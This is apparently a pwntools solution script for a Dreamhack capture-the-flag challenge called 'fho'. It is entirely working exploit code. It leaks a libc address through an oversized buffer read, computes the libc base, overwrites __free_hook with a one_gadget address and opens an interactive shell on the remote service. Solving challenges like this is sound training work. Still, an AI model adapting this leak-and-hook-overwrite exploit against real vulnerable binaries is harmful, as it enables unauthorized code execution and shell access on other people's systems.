from pwn import *

e = ELF('./fho')
rop = ROP(e)

# Local
#r = process('./fho')
#libc = e.libc

# Remote
r = remote('host3.dreamhack.games', 15320)
libc = ELF('./libc-2.27.so')

ONE_GADGET_OFFSET = 0x4f432
FREE_GOT = e.got['free']
RET = p64((rop.find_gadget(['ret']))[0])
PR_ADDR = p64((rop.find_gadget(['pop rdi', 'ret']))[0])

FREE_HOOK_OFFSET = libc.symbols['__free_hook']
SYSTEM_OFFSET = libc.symbols['system']
BINSH_OFFSET = list(libc.search(b"/bin/sh\x00"))[0]
LIBC_START_MAIN_OFFSET = libc.symbols['__libc_start_main'] + 231

# 1. Leak __libc_start_main + 231
PAYLOAD = b'\x90' * 72
r.sendafter(b'Buf', PAYLOAD)

LIBC_START_MAIN_REAL = u64(r.recvuntil(b'\n', drop=True)[79:] + b'\x00\x00')

# 2. Calc Libc Base, System func and /bin/sh Addr
LIBC_BASE = LIBC_START_MAIN_REAL - LIBC_START_MAIN_OFFSET
LIBC_BINSH = LIBC_BASE + BINSH_OFFSET
LIBC_ONE_GADGET = LIBC_BASE + ONE_GADGET_OFFSET
LIBC_FREE_HOOK = LIBC_BASE + FREE_HOOK_OFFSET

print('[+] LIBC_BASE IS ' + hex(LIBC_BASE))
print('[+] LIBC_BINSH IS ' + hex(LIBC_BINSH))
print('[+] LIBC_ONE_GADGET IS ' + hex(LIBC_ONE_GADGET))
print('[+] LIBC_FREE_HOOK IS ' + hex(LIBC_FREE_HOOK))

# 3. Exploit
r.recvuntil(b'To write: ')
r.sendline(str(LIBC_FREE_HOOK).encode())
r.recvuntil(b'With: ')
r.sendline(str(LIBC_ONE_GADGET).encode())
r.recvuntil(b'To free: ')
r.sendline(str(LIBC_BINSH).encode())

r.interactive()